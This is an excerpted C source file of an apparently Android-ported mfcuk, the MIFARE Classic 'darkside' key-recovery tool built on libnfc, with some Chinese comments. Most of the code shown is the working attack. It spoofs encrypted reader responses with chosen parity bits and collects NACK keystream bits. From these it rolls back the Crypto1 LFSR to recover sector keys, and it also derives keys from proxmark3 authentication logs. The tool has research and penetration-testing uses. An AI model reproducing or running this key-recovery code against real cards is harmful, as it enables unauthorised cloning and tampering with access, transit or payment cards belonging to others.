...
/*
 ...
 Description:
    ...
    a sorted array of Nt entries. We can see it as a hash maps/lookup table with
 ...
 Compiling:
    ...
    MSVS
        just copy an existing project (devices-anticol for example) from libnfc-1.2.1-vs2005,
...
static bool weak_mifare_mode = false;
...
tag_nonce_entry_t arrSpoofEntries[MAX_TAG_NONCES] = {
        0}; // "Cache" array of already received tag nonces, since we cannot 100% fix one tag nonce as of now
...
static bool
auth_from64Key(nfc_device *pnd, uint64_t key64, int uiBlock, mifare_cmd mc) {
    uint8_t key_arr[6] = {0};
    if (mfcuk_key_uint64_to_arr(&key64, key_arr)) {
        //print_hex(key_arr, sizeof(key_arr));
        //初始化为发起者模式!
        if (0 > nfc_initiator_init(pnd)) {
            ERR("configuring nfc_initiator_init");
            return false;
        }
        //TODO 谨记选卡
        nfc_target ti;
        if (nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &ti) <= 0) {
            ERR("nfc_initiator_select_passive_target");
            return false;
        }
        //建立一个结构体，储存M1卡参数
        mifare_param mp;
        memcpy(mp.mpa.abtAuthUid, ti.nti.nai.abtUid, ti.nti.nai.szUidLen);
        memcpy(mp.mpa.abtKey, key_arr, MIFARE_CLASSIC_KEY_BYTELENGTH);
...
static uint32_t mfcuk_key_recovery_block(nfc_device *pnd, uint32_t uiUID, uint64_t ui64Key,
                                         mifare_key_type bKeyType, uint8_t bTagType,
                                         uint32_t uiBlock, uint64_t *ui64KeyRecovered) {
    ...
    if ((bKeyType != keyA) && (bKeyType != keyB)) return MFCUK_FAIL_KEYTYPE_INVALID;

    if (!IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType))
        return MFCUK_FAIL_TAGTYPE_INVALID;

    if (!is_valid_block(bTagType, uiBlock)) return MFCUK_FAIL_BLOCK_INVALID;
    ...
    ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *) (&nt_orig), arrSpoofEntries,
                                                          numSpoofEntries,
    ...
    for (pos = 0; pos < 4; pos++) {
        ...
        if (sendSpoofAr) {
            if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
                ...
                abtArEnc[pos] =
                        (ptrFoundTagNonceEntry->nrEnc[ptrFoundTagNonceEntry->current_out_of_8]
                                >> (8 * (3 - pos))) & 0xFF;
                abtArEncPar[pos] =
                        ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] +
                          ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8])
                                >> (7 - pos)) & 0x01;
            }
        }
        ...
        */
        if (sendSpoofAr) {
            if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
                ...
                abtArEnc[pos] =
                        (ptrFoundTagNonceEntry->arEnc[ptrFoundTagNonceEntry->current_out_of_8]
                                >> (8 * (7 - pos))) & 0xFF;
                abtArEncPar[pos] =
                        ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] +
                          ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8])
    ...
    // Finally we want to write arbitrary parity bits
    ...
    int res;
    if (0 >
        (res = nfc_initiator_transceive_bits(pnd, abtArEnc, 64, abtArEncPar, abtRx, sizeof(abtRx),
                                             abtRxPar))) {
        if (sendSpoofAr) {
    ...
    if (res == 4) {
        ...
        if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
            ...
            ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] =
                    abtRx[0] & 0xf;
            ptrFoundTagNonceEntry->ks[ptrFoundTagNonceEntry->current_out_of_8] =
                    ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] ^ 0x5;
            ptrFoundTagNonceEntry->current_out_of_8++;

            if (ptrFoundTagNonceEntry->current_out_of_8 == 8) {
                for (pos = 0; pos < 8; pos++) {
                    for (pos2 = 0; pos2 < 8; pos2++) {
                        ptrFoundTagNonceEntry->parBitsArr[pos][pos2] =
                                ((ptrFoundTagNonceEntry->parBits[pos] +
                                  ptrFoundTagNonceEntry->parBitsCrntCombination[pos] - 1)
                                        >> (7 - pos2)) & 0x01;
                    }
                }

                states_list = lfsr_common_prefix(ptrFoundTagNonceEntry->spoofNrPfx,
                                                 ptrFoundTagNonceEntry->spoofArEnc,
                                                 ptrFoundTagNonceEntry->ks,
                                                 ptrFoundTagNonceEntry->parBitsArr,
                                                 weak_mifare_mode);

                for (i = 0; (states_list) &&
                            ((states_list + i)->odd != 0 || (states_list + i)->even != 0) &&
                            (i < (MAX_COMMON_PREFIX_STATES << 4)); i++) {
                    ...
                    if (weak_mifare_mode == false) {
                        if (bfOpts['v'] && (verboseLevel > 1)) {
                            printf("\nINFO: block %d recovered KEY: %012"
                                   PRIx64
                                   "\n", uiBlock,
                                   key_recovered);
                        }
                ...
                if (weak_mifare_mode == true) {
                    if (bfOpts['v'] && (verboseLevel > 2))
                        printf("\nINFO: %d candidates found, nonce %08x\n", i,
                               ptrFoundTagNonceEntry->tagNonce);
                    int maxhi = 0;
                    int maxlo = 0;
                    int maxhii = 0;
                    int maxloi = 0;
                    ...
                    //每次都验证一下
                    printf("\tTrying auth possible key: ");
                    if (auth_from64Key(pnd, (((uint64_t) maxhii << 24) + maxloi), uiBlock,
                                       abtAuth[0] == 96 ? MC_AUTH_A : MC_AUTH_B)) {
                        flag_key_recovered = 1;
...
static void print_usage(FILE *fp, const char *prog_name) {
    ...
    fprintf(fp,
            "-w threshold - use weak card mode with the provided maxhi/lo threshold. Use it if you get 0x03 error.\n");
    fprintf(fp, "\n");
...
static void print_mifare_classic_tag_actions(const char *title, mifare_classic_tag *tag) {
    ...
    printf("%s - UID %02x %02x %02x %02x - TYPE 0x%02x (%s)\n",
           title, tag->amb->mbm.abtUID[0], tag->amb->mbm.abtUID[1], tag->amb->mbm.abtUID[2],
           tag->amb->mbm.abtUID[3], bTagType,
           (IS_MIFARE_CLASSIC_1K(bTagType) ? (MIFARE_CLASSIC_1K_NAME) : (IS_MIFARE_CLASSIC_4K(
                                                                                 bTagType)
                                                                         ? (MIFARE_CLASSIC_4K_NAME)
                                                                         : (MIFARE_CLASSIC_UNKN_NAME)))
    );
    printf("---------------------------------------------------------------------\n");
    ...
    for (i = 0; i < max_blocks; i++) {
        ...
        ptr_trailer = (mifare_classic_block_trailer *) ((char *) tag + (trailer_block *
                                                                        MIFARE_CLASSIC_BYTES_PER_BLOCK));

        printf("%02d\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\n",
...
static bool mfcuk_darkside_select_tag(nfc_device *pnd, int iSleepAtFieldOFF, int iSleepAfterFieldON,
                                      nfc_target_info *ti) {
    nfc_target ti_tmp;
...
valid_prng_check(nfc_device *pnd, nfc_target_info *target, mifare_key_type keyType) {
    ...
    // 后判断卡的类型!
    if (!IS_MIFARE_CLASSIC_1K(target->nai.btSak) && !IS_MIFARE_CLASSIC_4K(target->nai.btSak)) {
...
int main(int argc, char *argv[]) {
    ...
    uint8_t pm3_log_multisect_decrypted[4] = {0};
    uint8_t pm3_log_multisect_verified[4] = {0};
    ...
    */
    ...
    while ((ch = getopt(argc, argv, "htwTDCi:I:o:O:V:R:S:s:v:M:U:d:n:P:p:F:")) != -1) { // -1 or EOF
        switch (ch) {
            // Name for the extended dump
            case 'n':
                strncpy(tag_recover_verify.description, optarg,
                        sizeof(tag_recover_verify.description));
                break;
            case 'C':
                bfOpts[ch] = true;
                break;
            ...
            case 'd':
                ...
                if (!(current_default_keys = realloc(current_default_keys,
                                                     numDefKeys * MIFARE_CLASSIC_KEY_BYTELENGTH))) {
                    ERR("failed to reallocate memory for current_default_keys");
                    return EXIT_FAILURE;
                }
                memcpy(&(current_default_keys[numDefKeys - 1]), &keyOpt,
                       MIFARE_CLASSIC_KEY_BYTELENGTH);
            ...
            case 'U':
                ...
                if (st >= MIFARE_CLASSIC_UID_BYTELENGTH) {
                    ...
                    memcpy(tag_recover_verify.tag_basic.amb[0].mbm.abtUID, uidOpt,
                           MIFARE_CLASSIC_UID_BYTELENGTH);
                    bfOpts[ch] = true;
                }
                break;
            case 'S':
                    ...
                    switch (iter) {
                        ...
                        case 0:
                            ...
                            if ((sector != -1) && !is_valid_sector(MIFARE_CLASSIC_4K, sector)) {
                                ...
                                for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1)
                                                                                 ? (MIFARE_CLASSIC_4K_MAX_SECTORS)
                                                                                 : (sector +
                                                                                    1)); i++) {
                                    // TODO: proper error handling for block and ptr_trailer
                                    block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
                                    ptr_trailer = (mifare_classic_block_trailer *) (
                                            (char *) (&tag_recover_verify.tag_basic) +
                                            (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));
                            ...
                            switch (token[0]) {
                                ...
                                case 'B':
                                    ...
                                    for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1)
                                        ...
                                        ptr_trailer->abtAccessBits[ACTIONS_KEY_B * (1 - (token[0] -
                                                                                         'A'))] &= (~action);
                                    }
                                    break;
                                default:
            ...
            case 'P':
                ...
                while ((token = strtok(str, sep)) &&
                       (iter < (int) (sizeof(pm3_full_set_log) / sizeof(pm3_full_set_log[0])))) {
                    str = NULL;
                    errno = 0;
                ...
                if (iter != sizeof(pm3_full_set_log) / sizeof(pm3_full_set_log[0])) {
                    ...
                    */
                    pm3_ks2 = pm3_full_set_log[PM3_READER_RESP] ^
                              prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 64);
                    pm3_ks3 = pm3_full_set_log[PM3_TAG_RESP] ^
                              prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 96);
                    ...
                    lfsr_rollback_word(pm3_revstate,
                                       pm3_full_set_log[PM3_UID] ^ pm3_full_set_log[PM3_TAG_CHAL],
                                       0);
                    crypto1_get_lfsr(pm3_revstate, &pm3_lfsr);
                    printf("proxmark3 log key: %02x%02x%02x%02x%02x%02x\n", pm3_plfsr[5],
                           pm3_plfsr[4], pm3_plfsr[3], pm3_plfsr[2], pm3_plfsr[1], pm3_plfsr[0]);
                    ...
                    if (token) {
                        ...
                        // strtoul failed somewhere. WTF?! strtoul() is not properly setting errno... errrrrggh!
                        if (errno != 0) {
                            WARN("Invalid hex literal %s for option -P at position %d", optarg,
                                 iter);
                        } else {
                            // TODO: what if the multi-sect authentication comes not directly after the first successful plain authentication, i.e. several read/write/incr/decr command occur first then multi-sect auth?! how does this affects the crypto stream/state, what should we do? need to simulate with a devices-multisect-auth program which has tests with interleaved multi-sect authentications
                            pm3_revstate_multisect_auth = lfsr_recovery64(pm3_ks2, pm3_ks3);

                            for (i = 0; i < 4; i++) {
                                uint8_t multisect_auth_byte =
                                        (pm3_log_multisect_auth >> (8 * (3 - i))) & 0xFF;
                                pm3_log_multisect_decrypted[i] =
                                        crypto1_byte(pm3_revstate_multisect_auth, 0x00, 0) ^
                                        multisect_auth_byte;
                            ...
                            if ((pm3_log_multisect_decrypted[0] == MC_AUTH_A) ||
                                (pm3_log_multisect_decrypted[0] == MC_AUTH_B)) {
                                iso14443a_crc_append(pm3_log_multisect_verified, 2);
                                int multisect_auth_verified = 1;
                                for (i = 0; i < 4; i++) {
                                    if (pm3_log_multisect_verified[i] !=
                                        pm3_log_multisect_decrypted[i]) {
                                ...
                                printf("proxmark3 log multi-sect auth detected: %02X %02X %02X %02X (parity crc %s)\n",
                                       pm3_log_multisect_decrypted[0],
                                       pm3_log_multisect_decrypted[1],
                                       pm3_log_multisect_decrypted[2],
                                       pm3_log_multisect_decrypted[3],
                                       multisect_auth_verified ? "ok" : "NOK");
                            }
            ...
            case 'F':
                if (!mfcuk_load_tag_dump(optarg, &(finger_tag))) {
                    ...
                    for (i = 0; i < mfcuk_finger_db_entries; i++) {
                        finger_score = -1.0f;
                        mfcuk_finger_db[i].tmpl_comparison_func(&(finger_tag),
                                                                mfcuk_finger_db[i].tmpl_data,
                                                                &finger_score);
                    ...
                    if (finger_index_highest > -1) {
                        printf("Tag '%s' matches '%s' with highest score %f\n", optarg,
                               mfcuk_finger_db[finger_index_highest].tmpl_name,
                               finger_score_highest);
    ...
    if (bfOpts['i'] || bfOpts['I']) {
        ...
        for (i = 0; i < MIFARE_CLASSIC_4K_MAX_SECTORS; i++) {
            ...
            ptr_trailer = (mifare_classic_block_trailer *) (
                    (char *) (&tag_recover_verify.tag_basic) +
                    (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));
            ptr_trailer_dump = (mifare_classic_block_trailer *) (
                    (char *) (&dump_loaded_tag.tag_basic) +
                    (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

            // If no command line keyA is set, copy from loaded dump
            if (!(ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_KEYSET)) {
                memcpy(&(ptr_trailer->abtKeyA[0]), &(ptr_trailer_dump->abtKeyA[0]),
                       MIFARE_CLASSIC_KEY_BYTELENGTH);
            ...
            if (!(ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_KEYSET)) {
                memcpy(&(ptr_trailer->abtKeyB[0]), &(ptr_trailer_dump->abtKeyB[0]),
                       MIFARE_CLASSIC_KEY_BYTELENGTH);
                // TODO: think if to make this sector ACTIONS_KEYSET or introduce a new value ACTIONS_KEYLOAD
            }
        }
        ...
        if (!bfOpts['U'] && !bfOpts['M']) {
            ptr_trailer = (mifare_classic_block_trailer *) (
                    (char *) (&tag_recover_verify.tag_basic) +
                    (0 * MIFARE_CLASSIC_BYTES_PER_BLOCK));
            ptr_trailer_dump = (mifare_classic_block_trailer *) (
                    (char *) (&dump_loaded_tag.tag_basic) + (0 * MIFARE_CLASSIC_BYTES_PER_BLOCK));
    ...
    if (weak_mifare_mode) {
        printf("Running in weak mifare mode...\n");
        printf("The wm mode can test some special nack Tag!\n");
        printf("good luck!:)\n");
    }
    ...
    memcpy(tag_on_reader.tag_basic.amb[0].mbm.abtUID, ti.nti.nai.abtUid,
           MIFARE_CLASSIC_UID_BYTELENGTH);
    ...
    if (!bfOpts['U']) {
        ...
        memcpy(tag_recover_verify.tag_basic.amb[0].mbm.abtUID, ti.nti.nai.abtUid,
               MIFARE_CLASSIC_UID_BYTELENGTH);
    }

    if (bfOpts['v'] && (verboseLevel > 0)) {
        print_mifare_classic_tag_actions("\n\nINITIAL ACTIONS MATRIX",
                                         &(tag_recover_verify.tag_basic));
    }

    max_sectors = (IS_MIFARE_CLASSIC_1K(tag_recover_verify.type) ? MIFARE_CLASSIC_1K_MAX_SECTORS
                                                                 : MIFARE_CLASSIC_4K_MAX_SECTORS);
    ...
    for (k = keyA; k <= keyB; k++) {
        ...
        for (i = 0; i < max_sectors; i++) {
            ...
            for (j = 0; (j < crntNumVerifKeys) &&
                        (ptr_trailer->abtAccessBits[action_byte] & ACTIONS_VERIFY) &&
                        !(ptr_trailer->abtAccessBits[result_byte] & ACTIONS_VERIFY); j++) {
                ...
                if (j == 0) {
                    memcpy(&(current_default_keys[0][0]), (k == keyA) ? (&(ptr_trailer->abtKeyA[0]))
                                                                      : ((&(ptr_trailer->abtKeyB[0]))),
                           MIFARE_CLASSIC_KEY_BYTELENGTH);
                }

                if (!mfcuk_key_arr_to_uint64(&(current_default_keys[j][0]), &crntVerifKey)) {
                    WARN("mfcuk_key_arr_to_uint64() failed, verification key will be %012"
                                 PRIx64
                                 "", crntVerifKey);
                }
                ...
                /*
                        ...
                        mfcuk_darkside_reset_advanced(pnd);
                */
                memcpy(mp.mpa.abtAuthUid, tag_recover_verify.tag_basic.amb[0].mbm.abtUID,
                       MIFARE_CLASSIC_UID_BYTELENGTH);
                ...
                if (0 > nfc_initiator_mifare_cmd(pnd, k, block, &mp)) {
                    ERR("AUTH sector %d, block %d, key %012"
                                PRIx64
                                ", key-type 0x%02x, error code 0x%02x", i, block, crntVerifKey, k,
                        uiErrCode);
                } else {
                    // Mark current key-type as verified
                    ptr_trailer->abtAccessBits[result_byte] |= ACTIONS_VERIFY;
                    ...
                    // Copy default key on top of dump only in case default keys option was specified in command line and the default key matched
                    memcpy((k == keyA) ? (ptr_trailer->abtKeyA) : (ptr_trailer->abtKeyB),
                           current_default_keys[j], MIFARE_CLASSIC_KEY_BYTELENGTH);
                }
    ...
    for (i = 0; i < max_sectors; i++) {
        ...
        block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
        ptr_trailer = (mifare_classic_block_trailer *) ((char *) (&tag_recover_verify.tag_basic) +
                                                        (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

        //是否需要显示扇区~!
        if ((ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_RECOVER) ||
            (ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_RECOVER)) {
            printf(" %x", i);
            fflush(stdout);
        }
        ...
        for (j = keyA; j <= keyB; j++) {
            ...
            if ((ptr_trailer->abtAccessBits[action_byte] & ACTIONS_RECOVER) &&
                ...
                // TODO: think of proper mechanism. this is temporary workaround in cases when reader hangs
                mfcuk_save_tag_dump("/sdcard/NfcTools/pm3/snapshot.mfd",
                                    &(tag_recover_verify.tag_basic));
                ...
                do {
                    ...
                    uiErrCode = mfcuk_key_recovery_block(pnd, tag_recover_verify.uid, crntRecovKey,
                                                         j, tag_recover_verify.type, block,
                                                         &ui64KeyRecovered);

                    if (uiErrCode != MFCUK_OK_KEY_RECOVERED && uiErrCode != MFCUK_SUCCESS &&
                        uiErrCode != MFCUK_FAIL_AUTH) {
                        ERR("mkrb code = 0x%02x\n", uiErrCode);
                    }
                ...
                if (!mfcuk_key_uint64_to_arr(&ui64KeyRecovered,
                                             (j == keyA) ? (&(ptr_trailer->abtKeyA[0]))
                                                         : (&(ptr_trailer->abtKeyB[0])))) {
                    WARN("\nmfcuk_key_uint64_to_arr() failed, recovered key should have been %012"
                                 PRIx64
                                 "", ui64KeyRecovered);
                }
            }
...
jint startExecute(JNIEnv *env, jobject instance, jstring command_) {
    ...
    //TODO 自己加上的初始化，不知有无影响
    numSpoofEntries = 0;
    numAuthAttempts = 0;
    numHit4 = 0;
    verboseLevel = 0;
    weak_mifare_mode = false;
    //解析从JAVA端传入的命令
    CMD *cmd = parse_command_line(command);
    if (cmd->len < 2) {
        print_usage(stdout, "mfcuk");
        return EXIT_FAILURE;
    }
    //释放内存
...
JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    ...
    //得到native函数的定义类
    jclass clazz = (*jniEnv)->FindClass(jniEnv, "cn/rrg/natives/MfcukTools");
    if (clazz == NULL) {
        return -1;
    }
